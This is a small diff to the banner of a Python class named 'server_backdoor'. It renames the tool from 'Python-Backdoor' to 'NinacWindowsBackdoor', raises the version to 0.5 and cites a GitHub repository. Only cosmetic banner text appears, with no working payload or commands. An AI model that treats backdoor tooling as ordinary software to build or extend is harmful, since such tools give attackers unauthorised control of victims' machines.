@@ -37,9 +37,9 @@ class server_backdoor:
         | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
         | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
         \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
-                                (Python-Backdoor)
+                                (NinacWindowsBackdoor)
 
-                                Version 0.4
+                                Version 0.5
                                 Github: https://github.com/felipecaninnovaes/NinacWindowsBackdoor
                                                         {}\n\n""".format(Fore.BLUE, Fore.RESET))
                 
